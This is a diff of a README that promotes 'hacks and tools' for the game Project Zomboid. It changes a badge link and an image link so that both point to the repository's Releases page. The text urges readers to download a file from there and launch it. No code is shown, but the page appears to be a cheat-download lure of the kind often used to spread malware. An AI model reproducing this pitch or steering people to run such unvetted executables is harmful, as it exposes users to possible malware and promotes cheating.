@@ -27,7 +27,7 @@ Explore the vast collection of hacks and tools available in this repository to t
 ## Get Started
 To access the latest release and start utilizing these hacks, click the button below:
 
-[![Download Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/releases/789694263/Release.zip)
+[![Download Release](https://github.com/momenelgasim/Project-Zomboid-Hack/releases)](https://github.com/momenelgasim/Project-Zomboid-Hack/releases)
 
 If the link ends with a file name, make sure to download it and launch the file to get started with the hacks. 
 
@@ -36,7 +36,7 @@ If the link does not work or is not provided, please check the "Releases" sectio
 ## Make Your Gaming Experience Unforgettable
 Enhance your Project Zomboid gaming experience with the cutting-edge hacks and tools provided in this repository. Stay ahead of the game, dominate the zombie apocalypse, and make your mark in the world of Project Zomboid.
 
-![Zomboid Hack](https://example.com/zomboid-hack-image.png)
+![Zomboid Hack](https://github.com/momenelgasim/Project-Zomboid-Hack/releases)
 
 ## Join the Community
 Connect with like-minded players, share your experiences, and discover new hacks and mods by joining the Project Zomboid community. Together, we can push the boundaries of what is possible in this immersive survival game.
